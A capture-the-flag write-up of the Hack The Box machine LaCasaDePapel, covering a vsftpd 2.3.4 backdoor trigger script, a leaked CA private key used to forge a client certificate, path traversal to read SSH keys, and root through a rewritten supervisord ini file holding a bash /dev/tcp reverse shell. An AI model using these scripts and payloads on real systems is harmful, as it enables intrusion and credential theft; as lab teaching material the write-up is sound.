---
title: HTB: LaCasaDePapel
url: https://0xdf.gitlab.io/2019/07/27/htb-lacasadepapel.html
date: 2019-07-27T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: hackthebox, htb-lacasadepapel, ctf, vsftpd, searchsploit, python, psy, php, php-disable-functions, certificate, client-certificate, openssl, directory-traversal, lfi, ssh, pspy, supervisord, cron, metasploit, ida, iptables, js, certificate-authority, reverse-engineering, youtube, oscp-plus-v1, oscp-plus-v2
---

![LaCasaDePapel-cover](https://0xdfimages.gitlab.io/img/lacasadepapel-cover.png)

LaCasaDePapel was a fun easy box that required quite a few steps for a 20 point box, but none of which were too difficult. I’ll start off exploiting a classic backdoor bug in VSFTPd 2.3.4 which has been modified to return a shell in Psy, a php based debugging tool. From there, I can collect a key file which I’ll use to sign a client certificate, gaining access to the private website. I’ll exploit a path traversal bug in the site to get an ssh key for one of the users. To privesc, I’ll find a file that’s controlling how a cron is being run by root. The file is not writable and owned by root, but sits in a directory my current user owns, which allows me to delete the file and then create a new one. In Beyond Root, I’ll look at the modified VSFTPd server and show an alternative path that allows me to skip the certificate generation to get access to the private website.

## Box Info

| Name | [LaCasaDePapel](https://hackthebox.com/machines/lacasadepapel)  [LaCasaDePapel](https://hackthebox.com/machines/lacasadepapel) [Play on HackTheBox](https://hackthebox.com/machines/lacasadepapel) |
| --- | --- |
| Release Date | [30 Mar 2019](https://twitter.com/hackthebox_eu/status/1111209952536920064) |
| Retire Date | 27 Jul 2019 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for LaCasaDePapel |
| Radar Graph | Radar chart for LaCasaDePapel |
| First Blood User | 01:21:37[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| First Blood Root | 03:31:18[qtc qtc](https://app.hackthebox.com/users/103578) |
| Creator | [thek thek](https://app.hackthebox.com/users/4615) |

## Recon

### nmap

`nmap` shows four ports open, ftp (21), ssh (22), http (80), and https (443):

```

root@kali# nmap -sT -p- --min-rate 10000 -oA scans/alltcp 10.10.10.131                                                                                                
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-01 16:13 EDT
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 25.39% done; ETC: 16:13 (0:00:12 remaining)
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 25.51% done; ETC: 16:13 (0:00:12 remaining)
Warning: 10.10.10.131 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.131
Host is up (0.019s latency).
Not shown: 61986 closed ports, 3545 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 22.05 seconds

root@kali# nmap -sU -p- --min-rate 10000 -oA scans/alludp 10.10.10.131                                                                                                
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-01 16:14 EDT
Warning: 10.10.10.131 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.131
Host is up (0.25s latency).
All 65535 scanned ports on 10.10.10.131 are open|filtered (65450) or closed (85)

Nmap done: 1 IP address (1 host up) scanned in 80.32 seconds

root@kali# nmap -p 21,22,80,443 -sC -sV -oA scans/nmap_scripts 10.10.10.131
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-01 16:16 EDT
Nmap scan report for 10.10.10.131
Host is up (0.13s latency).

PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: La Casa De Papel
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.80 seconds

```

### Website - TCP 80

The site is a picture (from the [TV show](https://twitter.com/lacasadepapel) this box is themed on) with a QR-code:

![1554165822335](https://0xdfimages.gitlab.io/img/1554165822335.png)

The qr decodes to:

```

otpauth://hotp/Token?secret=IJUWOYLIFRDE2RZPKVFWWQ3XPFWCMVST&algorithm=SHA1

```

This is definitely worth nothing moving forward, but I don’t end up finding an use for it.

### Website - TCP 443

The HTTPS site is similar, but different, as it complains about a certificate error:

![1554165925479](https://0xdfimages.gitlab.io/img/1554165925479.png)

I’ll make note to look for a way to generate a client certificate.

### FTP

Often when I see FTP in `nmap` results on CTFs, the scripts point out anonymous login. That wasn’t the case here. That typically means there’s not much to do until I find creds. However, it’s always worth checking the version for vulnerabilities, and in case I didn’t recognize this version as a relatively famously backdoored version, I could have found it with `searchsploit`:

```

root@kali# searchsploit vsftpd 2.3.4
-------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                |  Path
                                                              | (/usr/share/exploitdb/)
-------------------------------------------------------------- ----------------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)        | exploits/unix/remote/17491.rb
-------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

## Psy Shell

### Exploit

Running Metasploit’s exploit against this box won’t work. I’ll explain why in [Beyond Root](#vsftpd-deep-dive). Luckily for me, I always try to do things manually first. After some googling and reading a couple articles like [this one](https://sweshsec.wordpress.com/2015/07/31/vsftpd-vulnerability-exploitation-with-manual-approach/), I can see it turns out the vulnerability is pretty simple. Connect to FTP with any username that contains `:)`, and any password. Then connect to port 6200 to get a shell.

I can make this FTP connection with `nc`:

```

root@kali# nc 10.10.10.131 21
220 (vsFTPd 2.3.4)
USER backdoored:)
331 Please specify the password.
PASS invalid

```

Now connect to the backdoor, and get a shell:

```

root@kali# rlwrap nc 10.10.10.131 6200
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman

```

### Script

I wrote a quick script to trigger this exploit:

```

#!/usr/bin/env python3

import socket
import subprocess
import sys
import time

if len(sys.argv) < 2:
    print(f"{sys.argv[0]} [ip] [port = 21]")
    print("port defaults to 21 if not given")
    sys.exit()
elif len(sys.argv) == 2:
    port = 21
else:
    port = int(sys.argv[2])
target = sys.argv[1]

print(f"[*] Connecting to {target}:{port}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.send(b'USER 0xdf:)\n')
s.send(b'PASS 0xdf\n')
time.sleep(2)
s.close()
print('[+] Backdoor triggered')
print('[*] Connecting')

try:
    sh = subprocess.Popen(f"nc {target} 6200", shell=True)
    sh.poll()
    sh.wait()
except KeyboardInterrupt:
    print("[!] Exiting Shell")

```

Run it to connect:

```

root@kali# ./trigger_backdoor.py 10.10.10.131
[*] Connecting to 10.10.10.131:21
[+] Backdoor triggered
[*] Connecting
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
getcwd()
=> "/"
get_current_user()
=> "root"

```

A copy of this script is also in my [gitlab](https://gitlab.com/0xdf/ctfscripts).

### Psy

This strange shell is [psy](https://psysh.org/), a “A runtime developer console, interactive debugger and REPL for PHP.” It takes php commands:

```

Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
getcwd()
=> "/"
get_current_user()
=> "root"

```

Unfortunately, `system` and other commands that run code on the OS seem to be blocked:

```

system('echo test');
PHP Fatal error:  Call to undefined function system() in Psy Shell code on line 1

```

For some reason, `system` is undefined. If I run `phpinfo()`, I can see why:

```

phpinfo()
PHP Version => 7.2.10                                        

System => Linux lacasadepapel 4.14.78-0-virt #1-Alpine SMP Tue Oct 23 11:43:38 UTC 2018 x86_64 
Build Date => Sep 17 2018 09:23:43
...[snip]...
disable_functions => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
...[snip]...

```

The functions that would give me execution are blocked.

I can enumerate the box using `scandir` to list files, and `file_get_contents` to read files.

```

scandir("/home")
=> [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]
file_get_contents("/etc/os-release")
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.8.1
PRETTY_NAME="Alpine Linux v3.8"
HOME_URL="http://alpinelinux.org"
BUG_REPORT_URL="http://bugs.alpinelinux.org"

```

The `help` command does give a bunch of options related to debugging code:

```

help
  help       Show a list of commands. Type `help [foo]` for information about [foo].      Aliases: ?                     
  ls         List local, instance or class variables, methods and constants.              Aliases: list, dir             
  dump       Dump an object or primitive.
  doc        Read the documentation for an object, class, constant, method or property.   Aliases: rtfm, man             
  show       Show the code for an object, class, constant, method or property.
  wtf        Show the backtrace of the most recent exception.                             Aliases: last-exception, wtf?  
  whereami   Show where you are in the code.
  throw-up   Throw an exception or error out of the Psy Shell.
  timeit     Profiles with a timer.
  trace      Show the current call stack.
  buffer     Show (or clear) the contents of the code input buffer.                       Aliases: buf                   
  clear      Clear the Psy Shell screen.
  edit       Open an external editor. Afterwards, get produced code in input buffer.
  sudo       Evaluate PHP code, bypassing visibility restrictions.
  history    Show the Psy Shell history.                                                  Aliases: hist                  
  exit       End the current session and return to caller.                                Aliases: quit, q

```

## Shell as Professor

### Find Key

In looking around the box, I checked out the home directories and found something interesting in `/home/nairobi`:

```

scandir("/home/nairobi/")
=> [
     ".",
     "..",
     "ca.key",
     "download.jade",
     "error.jade",
     "index.jade",
     "node_modules",
     "server.js",
     "static",
   ]     

echo file_get_contents("/home/nairobi/ca.key")
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl
uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M
YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp
s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us
PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V
Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89
1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ
/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+
q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr
uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd
I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og
7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE
G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn
sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH
CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y
sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI
ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2
zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/
ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC
9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M
WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM
7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR
aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc
53udBEzjt3WPqYGkkDknVhjD
-----END PRIVATE KEY-----

```

Given that I was seeing errors with TLS on the port 443 site earlier, this is interesting. There’s an alternative way to find this key, and that’s using `psy` itself. If I run `ls`, it shows me a variable, `$tokoyo`, and it’s contents point to the key:

```

ls
Variables: $tokyo
show $tokyo
  > 2| class Tokyo {
    3|  private function sign($caCert,$userCsr) {
    4|          $caKey = file_get_contents('/home/nairobi/ca.key');
    5|          $userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=>'sha256']);
    6|          openssl_x509_export($userCert, $userCertOut);
    7|          return $userCertOut;
    8|  }
    9| }

```

### Access Private Area

With access to the private key for the webserver, I can create a client certificate which will hopefully show me something new when I connect.

I can use `openssl` to look at the TLS configuration on this site. There’s a section on accepted certificates:

```

root@kali# openssl s_client -connect 10.10.10.131:443
CONNECTED(00000003)
depth=0 CN = lacasadepapel.htb, O = La Casa De Papel
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = lacasadepapel.htb, O = La Casa De Papel
verify return:1
---
Certificate chain
 0 s:CN = lacasadepapel.htb, O = La Casa De Papel
   i:CN = lacasadepapel.htb, O = La Casa De Papel
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIC6jCCAdICCQDISiE8M6B29jANBgkqhkiG9w0BAQsFADA3MRowGAYDVQQDDBFs
YWNhc2FkZXBhcGVsLmh0YjEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDAeFw0x
OTAxMjcwODM1MzBaFw0yOTAxMjQwODM1MzBaMDcxGjAYBgNVBAMMEWxhY2FzYWRl
cGFwZWwuaHRiMRkwFwYDVQQKDBBMYSBDYXNhIERlIFBhcGVsMIIBIjANBgkqhkiG
9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3M6VN7OD5sHW+zCbIv/5vJpuaxJF3A5q2rV
QJNqU1sFsbnaPxRbFgAtc8hVeMNii2nCFO8PGGs9P9pvoy8e8DR9ksBQYyXqOZZ8
/rsdxwfjYVgv+a3UbJNO4e9Sd3b8GL+4XIzzSi3EZbl7dlsOhl4+KB4cM4hNhE5B
4K8UKe4wfKS/ekgyCRTRENVqqd3izZzz232yyzFvDGEOFJVzmhlHVypqsfS9rKUV
ESPHczaEQld3kupVrt/mBqwuKe99sluQzORqO1xMqbNgb55ZD66vQBSkN2PwBeiR
PBRNXfnWla3Gkabukpu9xR9o+l7ut13PXdQ/fPflLDwnu5wMZwIDAQABMA0GCSqG
SIb3DQEBCwUAA4IBAQCuo8yzORz4pby9tF1CK/4cZKDYcGT/wpa1v6lmD5CPuS+C
hXXBjK0gPRAPhpF95DO7ilyJbfIc2xIRh1cgX6L0ui/SyxaKHgmEE8ewQea/eKu6
vmgh3JkChYqvVwk7HRWaSaFzOiWMKUU8mB/7L95+mNU7DVVUYB9vaPSqxqfX6ywx
BoJEm7yf7QlJTH3FSzfew1pgMyPxx0cAb5ctjQTLbUj1rcE9PgcSki/j9WyJltkI
EqSngyuJEu3qYGoM0O5gtX13jszgJP+dA3vZ1wqFjKlWs2l89pb/hwRR2raqDwli
MgnURkjwvR1kalXCvx9cST6nCkxF2TxlmRpyNXy4
-----END CERTIFICATE-----
subject=CN = lacasadepapel.htb, O = La Casa De Papel

issuer=CN = lacasadepapel.htb, O = La Casa De Papel
---
Acceptable client certificate CA names
CN = lacasadepapel.htb, O = La Casa De Papel
Client Certificate Types: RSA sign, DSA sign, ECDSA sign
Requested Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224:RSA+SHA1:DSA+SHA1:ECDSA+SHA1
Shared Requested Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224
Peer signing digest: SHA512
Peer signature type: RSA
Server Temp Key: ECDH, P-256, 256 bits
---
SSL handshake has read 1553 bytes and written 442 bytes
Verification error: self signed certificate
---
New, TLSv1.2, Cipher is ECDHE-RSA-AES128-GCM-SHA256
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES128-GCM-SHA256
    Session-ID: B1DBFEEEFA037FDC8BAE800DE2549CF10353955397452FA8A4765DEEBEA0E50F
    Session-ID-ctx:
    Master-Key: C1D1FA4F1BA4C2FABDE34E8D95424C5B57A023D4CC5888AAF0822B4FC8121D81D059D9F5DD4A5388237D277EC70779C6
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 300 (seconds)
    TLS session ticket:
    0000 - 4c 5a 06 97 cb 93 0b 9f-e7 5c 1c 9a 34 2f 89 59   LZ.......\..4/.Y
    0010 - 0a b9 46 16 b7 8c 1c de-2f 90 8d a0 7e 1b b4 ff   ..F...../...~...
    0020 - 6d 38 47 f2 76 99 df 08-bb 31 cd 63 ef 2d 6b a7   m8G.v....1.c.-k.
    0030 - 37 22 d5 12 a2 00 00 76-81 64 6e 4c 5c 78 5e 13   7".....v.dnL\x^.
    0040 - d2 09 c5 dc f1 51 60 54-18 4f ad 10 df 90 f6 f1   .....Q`T.O......
    0050 - 41 98 10 ba 41 cb c7 1e-f6 c7 39 33 af df 8b ff   A...A.....93....
    0060 - 03 03 63 ea a3 3d 50 57-9a ac fe d3 64 ed 6b cb   ..c..=PW....d.k.
    0070 - 7c e3 0e a5 b9 c3 e1 5f-69 69 48 00 1d 75 40 1d   |......_iiH..u@.
    0080 - 9d 46 4a f7 be 04 25 d8-9c ee fa d3 f7 d8 92 24   .FJ...%........$
    0090 - 63 2e 1c 6d 5a 3e 34 9a-9b be 4b e5 53 7f 52 7d   c..mZ>4...K.S.R}
    00a0 - cc b8 53 8e d8 8f ec ec-eb ae 56 bd 0c 13 49 89   ..S.......V...I.
    00b0 - 03 57 97 0f 89 32 f3 84-d6 e9 ab 36 c2 b0 fd 05   .W...2.....6....
    00c0 - 40 94 c9 c2 d4 59 20 4c-32 06 51 68 2e 51 55 35   @....Y L2.Qh.QU5

    Start Time: 1554214579
    Timeout   : 7200 (sec)
    Verify return code: 18 (self signed certificate)
    Extended master secret: no
---

```

I’ll use the key and this information to make a certificate for myself:

```

root@kali# openssl req -x509 -new -nodes -key ca.key -sha256 -days 1024 -out 0xdf.pem
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:La Casa De Papel
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:lacasadepapel.htb
Email Address []:
root@kali# openssl pkcs12 -export -in 0xdf.pem -inkey ca.key -out 0xdf.p12
Enter Export Password:
Verifying - Enter Export Password:

```

Now I’ll load it into firefox by going into preferences, searching for certificates, hitting “View Certificates”, and then hitting “Import…” and selecting my .p12. Now, with Burp off, I can reload the page, and it pops up asking me to confirm I want to send my certificate:

![1554215724810](https://0xdfimages.gitlab.io/img/1554215724810.png)

After I click ok, I see the site, now with a “Private Area”:

![1554215018465](https://0xdfimages.gitlab.io/img/1554215018465.png)

This part could be a bit finicky. If the page doesn’t prompt for the certificate on reload, try things like restarting the browser, clearing the cache, and untrusting the site (clicking on the padlock, then “connection not secure”, and then “Remove Exception”).

### Path Traversal

Once I click a season, I get sent to `https://lacasadepapel.htb/?path=SEASON-2`:

![1554215054468](https://0xdfimages.gitlab.io/img/1554215054468.png)

If I click on one of the avis, it takes me to `https://lacasadepapel.htb/file/U0VBU09OLTIvMDEuYXZp`. That base64 on the end of the path is just the file name:

```

root@kali# echo U0VBU09OLTIvMDEuYXZp | base64 -d
SEASON-2/01.avi

```

I can also browser around. Visit the parent directory shows what looks like a home dir `https://lacasadepapel.htb/?path=..`:

![1554215178613](https://0xdfimages.gitlab.io/img/1554215178613.png)

I can get `user.txt`, just remembering to base64 encode the path, which I can do in a one-liner here:

```

root@kali# curl -k https://10.10.10.131/file/$(echo -n "../user.txt" | base64)
4dcbd172...

```

In `bash`, `$()` means run what’s in here, and put the output in its place. So in this case, I’m base64 encoding the path, and then using the result to build the url to `curl`.

### Find Private Key

In the homedir for berlin, there’s a `.ssh` directory:

![1563524844410](https://0xdfimages.gitlab.io/img/1563524844410.png)

I’ll pull these files back. I’ll notice that the public key doesn’t match what’s in the `authorized_keys` file:

```

root@kali# curl -k https://10.10.10.131/file/$(echo -n "../.ssh/authorized_keys" | base64)
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAsDHKXtzjeyuWjw42RbtoDy2c6lWdtfEzsmqmHrbJDY2hDcKWekWouWhe/NTCQFim6weKtsEdTzh0Qui+6jKc8/ZtpKzHrXiSXSe48JwpG7abmp5iCihzDozJqggBNoAQrvZqBhg6svcKh8F0kTnxUkBQgBm4kjOPteN+TfFoNIod7DQ72/N25D/lVThCLcStbPkR8fgBz7TGuTTAsNFXVwjlsgwi2qUF9UM6C1JkMBk5Y9ssDHiu4R35R5eCl4EEZLL946n/Gd5QB7pmIRHMkmt2ztOaKU4xZthurZpDXt+Et+Rm3dAlAZLO/5dwjqIfmEBS1eQ4sT8hlUkuLvjUDw== thek@ThekMac.local
root@kali# curl -k https://10.10.10.131/file/$(echo -n "../.ssh/id_rsa.pub" | base64)
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCi0fpiC6mLsmGN1sNeGDZ/3GbPFoM13HESKgCAfYaNR5Rzhwl5N9T/JaDW/LHV1epqd/ADNg5AtSA73+sNsj3LnWtNCcuEeyn+IWIZ28M7mJnAs2vCbNUvGAZz6Y1pzerEdy4fHur7NAcHw19T+rPIAvb/GxGTME4NGDbW2xWqdNXzdPwIVIFQ7aPOK0cU2O9htpw/4mf1DljYdF0TTcNacAknvOThJZaJwzeuK65jJ6pXo5gpugfCL4UH3hjHXFo8UY/tPSOcFTeaiVRGEoqiU2pjvw8TmpimU7947kf/u8pusXsnlW2xWm8ZCyaOpSFAr8ahisy50iFx9BIxSemBZdi0KcikFrndpj9+XRdikv1rVlCHWIabiiV5Wdk2+oxriZv7yQLyTdYObD2mr9bd4ZVDpd7KP/iRQQ17VDzGP0EhctknBdge0AItLg9oplJFoVKORz/br9Pb3nx/agGokt/6jGLJ2BxMja8Lfg5jDBLtw5xKxLgeK9QLorugkkfDedQ2gDaB7dzCI7ps0esQowlY6symn1Qf0FtD+7uTkCntAXzIF+t0LrgQBTPJkldZ17U2FI2OIjSsGrMI9lAZI4sQgUDDNTRswi4m7gkhA4Af7e1+iHxxxR01yZ8fstpPukXdVjDKg8yjAukDx8bgVcbK+jKt95NcLoZjT7U1VQ== berlin@lacasadepapel.htb

```

I tried to access the `authorized_keys` files for all the other users, but wasn’t able to.

### SSH

Still, I have this private key, so I’ll try to see if it logs in as any of the user I know of on the box. I’ll use a `bash` for loop to try each one, and when I get to professor, it works:

```

root@kali# for user in berlin dali nairobi oslo professor; do ssh -oBatchMode=yes -i ~/id_rsa_lacasadepapel_berlin $user@10.10.10.131; done
berlin@10.10.10.131: Permission denied (publickey,password,keyboard-interactive).
dali@10.10.10.131: Permission denied (publickey,password,keyboard-interactive).
nairobi@10.10.10.131: Permission denied (publickey,password,keyboard-interactive).
oslo@10.10.10.131: Permission denied (publickey,password,keyboard-interactive).

 _             ____                  ____         ____                  _ 
| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
                                                            |_|       

lacasadepapel [~]$ id
uid=1002(professor) gid=1002(professor) groups=1002(professor)

```

## Priv: professor –> root

### Enumeration

In professor’s homedir, there are two files about `memcache`:

```

lacasadepapel [~]$ ls
memcached.ini  memcached.js   node_modules

```

I can see the ini file has an entry to load and run the js file as nobody:

```

lacasadepapel [~]$ cat memcached.ini 
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js

```

If I load [pspy](https://github.com/DominicBreuker/pspy), sometimes I had success seeing this run every minute, but others I didn’t. But I could always notice this in the process list:

```

lacasadepapel [~]$ ps auxww | grep memcached.js
 3756 nobody    0:17 /usr/bin/node /home/professor/memcached.js

```

And if I waited a minute, the pid would change:

```

lacasadepapel [~]$ ps auxww | grep memcached.js
 3823 nobody    0:06 /usr/bin/node /home/professor/memcached.js

```

So each minute, this script was being run as nobody.

Additionally, I could run `pspy` with `-f` to enable file events. This is very loud, but in cases where the default of printing commands doesn’t show something, it can reveal activity. In this case (with lots of snips), each minute I’ll see:

```

lacasadepapel [/tmp/.d]$ wget 10.10.14.10/pspy64
Connecting to 10.10.14.10 (10.10.14.10:80)
pspy64               100% |****************************************************************************************************************************************************************************| 4364k  0:00:00 ETA 
lacasadepapel [/tmp/.d]$ chmod +x pspy64
lacasadepapel [/tmp/.d]$ ./pspy64 -f
...[snip]...
2019/07/26 05:26:01 FS:                 OPEN | /etc/supervisord.conf                                                      
2019/07/26 05:26:01 FS:               ACCESS | /etc/supervisord.conf                                                         
2019/07/26 05:26:01 FS:             OPEN DIR | /home/professor                                                                
2019/07/26 05:26:01 FS:             OPEN DIR | /home/professor/                                                               
2019/07/26 05:26:01 FS:           ACCESS DIR | /home/professor                                                                
2019/07/26 05:26:01 FS:           ACCESS DIR | /home/professor/                                                              
2019/07/26 05:26:01 FS:           ACCESS DIR | /home/professor                                                                
2019/07/26 05:26:01 FS:           ACCESS DIR | /home/professor/
2019/07/26 05:26:01 FS:    CLOSE_NOWRITE DIR | /home/professor
2019/07/26 05:26:01 FS:    CLOSE_NOWRITE DIR | /home/professor/
2019/07/26 05:26:01 FS:                 OPEN | /home/professor/memcached.ini
2019/07/26 05:26:01 FS:               ACCESS | /home/professor/memcached.ini
2019/07/26 05:26:01 FS:        CLOSE_NOWRITE | /home/professor/memcached.ini 
...[snip]...

```

Something goes into `/etc/supervisord.conf`, then into `/home/professor/memcached.ini`. `supervisord`, or the Supervisor daemon, is a process management system, and it include the ability to run things periodically similar to how `cron` does. If I cheat and peak ahead with a root shell, I can see the contents of `supervisord.conf` say to include all `ini` files in professor’s homedir:

```

bash-4.4# cat /etc/super*.conf
cat /etc/super*.conf
[unix_http_server]
file=/run/supervisord.sock

[supervisord]
logfile=/dev/null
logfile_maxbytes=0
user=root

[rpcinterface:supervisor]
supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface

[supervisorctl]
serverurl=unix:///run/supervisord.sock

[include]
files = /home/professor/*.ini

```

### Exploitation

If I could write to this file, I could change the command, and get a shell as the process that’s running the command in the ini file. But the file is owned by root and not writable by professor:

```

lacasadepapel [~]$ ls -l memcached.ini 
-rw-r--r--    1 root     root            88 Jan 29 01:25 memcached.ini

```

However, it’s sitting in a directory that professor owns:

```

lacasadepapel [~]$ ls -ld .
drwxr-sr-x    4 professo professo      4096 Mar  6 20:56 .

```

So I can’t edit it:

```

lacasadepapel [~]$ echo test >> memcached.ini 
-ash: can't create memcached.ini: Permission denied

```

But I can delete it and make a new one:

```

lacasadepapel [~]$ cp memcached.ini /dev/shm/
lacasadepapel [~]$ rm memcached.ini 
rm: remove 'memcached.ini'? y
lacasadepapel [~]$ echo -e "[program:memcached]\ncommand = bash -c 'bash -i  >& /dev/tcp/10.10.14.10/443 0>&1'" > memcached.ini
lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = bash -c 'bash -i  >& /dev/tcp/10.10.14.10/443 0>&1'
lacasadepapel [~]$ ls -l memcached.ini 
-rw-r--r--    1 professo professo        71 Jul 19 08:48 memcached.ini

```

Now just wait a minute, and get a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
